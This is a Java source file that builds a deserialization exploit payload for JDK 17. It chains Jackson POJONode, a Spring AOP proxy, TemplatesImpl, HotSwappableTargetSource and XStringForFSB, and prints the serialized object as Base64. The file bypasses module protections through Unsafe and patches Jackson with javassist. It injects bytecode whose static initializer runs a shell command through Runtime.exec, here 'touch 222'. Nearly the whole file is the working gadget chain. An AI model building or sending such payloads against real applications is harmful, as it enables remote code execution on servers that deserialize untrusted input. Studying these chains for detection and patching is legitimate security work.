package cc.java;
import javax.swing.event.EventListenerList;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import javax.swing.undo.UndoManager;
import java.util.*;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.springframework.aop.target.HotSwappableTargetSource;
import sun.misc.Unsafe;
import java.lang.reflect.Method;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;
import sun.reflect.ReflectionFactory;

import javax.xml.transform.Templates;
import java.lang.reflect.*;


// --add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED
public class XString17 {
    public static void main(String[] args) throws Exception{
        // 删除writeReplace保证正常反序列化
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace");
            jsonNode.removeMethod(writeReplace);
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            jsonNode.toClass(classLoader, null);
        } catch (Exception e) {
        }

        // 把模块强行修改，切换成和目标类一样的 Module 对象
        ArrayList<Class> classes = new ArrayList<>();
        classes.add(TemplatesImpl.class);
        classes.add(POJONode.class);
        classes.add(HashMap.class);
        classes.add(XString17.class);
        classes.add(Field.class);
        classes.add(Method.class);
        new XString17().bypassModule(classes);

        // ===== EXP 构造 =====
        byte[] code1 = getTemplateCode();
        byte[] code2 = ClassPool.getDefault().makeClass("fushuling").toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "xxx");
        setFieldValue(templates, "_bytecodes", new byte[][]{code1, code2});
        setFieldValue(templates,"_transletIndex",0);
        //setFieldValue(templates, "_tfactory", new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());

        POJONode node = new POJONode(makeTemplatesImplAopProxy(templates));
        HashMap eventListenerList=getXstringfb(node);
        //EventListenerList eventListenerList = getEventListenerList(node);

        //serialize(eventListenerList, true);
        serialize(eventListenerList, true);
    }

    public static byte[] serialize(Object obj, boolean flag) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        if (flag) System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
        return baos.toByteArray();
    }

    public static Object makeTemplatesImplAopProxy(TemplatesImpl templates) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }

  /*  public static HashMap makeMap(Object v1, Object v2) throws Exception {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }*/


    public static byte[] getTemplateCode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass template = pool.makeClass("MyTemplate");
        String block = "Runtime.getRuntime().exec(\"touch 222\");";
        template.makeClassInitializer().insertBefore(block);


        // 在构造器中插入要每次执行的逻辑 —— 每次 new 都会执行
        /*CtConstructor ctor = new CtConstructor(new CtClass[0], template);
        String ctorBody =
                "{\n" +
                        "  try {\n" +
                        "    // 使用数组形式避免参数解析问题\n" +
                        "    Runtime.getRuntime().exec(new String[]{\"touch\",String.valueOf((int)System.currentTimeMillis()%100)});\n" +
                        "  } catch (Exception e) {\n" +
                        "    // 不要让构造器吞掉严重错误；根据需要改为抛出\n" +
                        "    throw new RuntimeException(e);\n" +
                        "  }\n" +
                        "}";
        ctor.setBody(ctorBody);
        template.addConstructor(ctor);*/

        // 导出字节码
        byte[] bytes = template.toBytecode();
        // template.detach(); // 释放 CtClass 对象（防止内存/permgen 泄露）
        return bytes;
    }


    public static Field getField(Class<?> clazz, String fieldName) {
        Field field = null;

        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException var4) {
            if (clazz.getSuperclass() != null) {
                field = getField(clazz.getSuperclass(), fieldName);
            }
        }
        return field;
    }


    public static HashMap getXstringfb(Object obj) throws Exception {

        Constructor<Object> objCons = Object.class.getDeclaredConstructor(new Class[0]);

        objCons.setAccessible(true);
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        if (cl == null) cl = ClassLoader.getSystemClassLoader();

        Class<?> targetClass = Class.forName(
                "com.sun.org.apache.xpath.internal.objects.XStringForFSB",
                false,
                cl
        );
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(targetClass, objCons);
        sc.setAccessible(true);
        Object xStringForFSB = sc.newInstance(new Object[0]);
        // Field field=getField(xStringForFSB.getClass(),"m_obj");

        //field.set(xStringForFSB, (Object)null);


        //HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(obj);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(xStringForFSB);
        HashMap wu = new HashMap();
        HotSwappableTargetSource hotSwappableTargetSource3 =new HotSwappableTargetSource(wu);

        HashMap<Object,Object> hashMap = new HashMap<Object,Object>();
        hashMap.put(hotSwappableTargetSource3, "x");
        hashMap.put(hotSwappableTargetSource2, "x");
        Field target_field =hotSwappableTargetSource3.getClass().getDeclaredField("target");
        target_field.setAccessible(true);
        target_field.set(hotSwappableTargetSource3, obj);


        return hashMap;
        //return makemap(hotSwappableTargetSource2,hotSwappableTargetSource3);

    }

    public static HashMap makemap(Object v1, Object v2) throws Exception {
        HashMap s = new HashMap();
        Field size_field =s.getClass().getDeclaredField("size");
        size_field.setAccessible(true);
        size_field.set(s, 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v2, v2, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v1, v1, null));


        Field fields=getField(s.getClass(),"table");

        fields.set(s, tbl);
        return s;
    }

    public static EventListenerList getEventListenerList(Object obj) throws Exception{
        EventListenerList list = new EventListenerList();
        UndoManager undomanager = new UndoManager();

        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。
        Vector vector = (Vector) getFieldValue(undomanager, "edits");
        vector.add(obj);

        setFieldValue(list, "listenerList", new Object[]{Class.class, undomanager});
        return list;
    }

    private static Method getMethod(Class clazz, String methodName, Class[]
            params) {
        Method method = null;
        while (clazz!=null){
            try {
                method = clazz.getDeclaredMethod(methodName,params);
                break;
            }catch (NoSuchMethodException e){
                clazz = clazz.getSuperclass();
            }
        }
        return method;
    }
    private static Unsafe getUnsafe() {
        Unsafe unsafe = null;
        try {
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (Unsafe) field.get(null);
        } catch (Exception e) {
            throw new AssertionError(e);
        }
        return unsafe;
    }
    public void bypassModule(ArrayList<Class> classes){
        try {
            Unsafe unsafe = getUnsafe();
            Class currentClass = this.getClass();
            try {
                Method getModuleMethod = getMethod(Class.class, "getModule", new
                        Class[0]);
                if (getModuleMethod != null) {
                    for (Class aClass : classes) {
                        Object targetModule = getModuleMethod.invoke(aClass, new Object[]{});
                        unsafe.getAndSetObject(currentClass,
                                unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), targetModule);
                    }
                }
            }catch (Exception e) {
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = null;
        Class c = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                field = c.getDeclaredField(fieldName);
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        field.setAccessible(true);
        return field.get(obj);
    }

    public static void setFieldValue(Object obj, String field, Object val) throws Exception {
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
}